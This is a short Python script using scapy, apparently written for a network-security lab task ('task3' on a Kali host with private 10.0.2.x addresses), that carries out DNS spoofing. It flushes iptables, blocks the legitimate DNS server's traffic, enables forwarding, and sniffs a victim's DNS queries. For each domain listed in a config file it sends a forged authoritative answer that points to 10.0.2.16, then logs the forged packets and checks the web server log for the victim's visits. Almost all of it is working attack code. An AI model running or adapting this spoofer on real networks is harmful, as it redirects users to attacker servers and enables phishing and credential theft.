from scapy.all import *
import configparser
import os

PCAP_FILE = "/home/kali/task3_spoofed_response.pcap" #Saving the Pcap file.
print(f"[+] Starting PCAP: {PCAP_FILE}")
pcap = PcapWriter(PCAP_FILE, append=False)

os.system("iptables -F")
os.system("iptables -A FORWARD -s 10.0.2.15 -p udp --sport 53 -j DROP")
os.system("iptables -A FORWARD -s 10.0.2.15 -p udp --dport 53 -j DROP")
os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null")

conf.L3socket = L3RawSocket
config = configparser.ConfigParser()
config.read("spoof_targets.conf")

SPOOF = {}
for domain, ip in config["targets"].items():
    key = domain.strip().encode() + b'.'
    SPOOF[key] = ip.strip()

print(f"[+] LOADED {len(SPOOF)} domains from spoof_targets.conf: 10.0.2.16")

count = 0
def spoof_dns(pkt):
    global count
    if pkt[IP].src != "10.0.2.17" or not pkt.haslayer(DNSQR):
        return
    
    qname = pkt[DNSQR].qname
    if qname in SPOOF:
        count += 1
        domain = qname.decode(errors='ignore').rstrip('.')

        spoofed = IP(dst="10.0.2.17", src="10.0.2.15")/\
                  UDP(dport=pkt[UDP].sport, sport=53)/\
                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                      an=DNSRR(rrname=qname, ttl=10, rdata="10.0.2.16"))

        send(spoofed, verbose=0)
        pcap.write(spoofed)
        os.system("tail -n 2 /var/log/apache2/access.log | grep 10.0.2.17 || true")


print("[*] Waiting for victim query...")
sniff(filter="udp port 53 and src host 10.0.2.17", iface="eth0", prn=spoof_dns)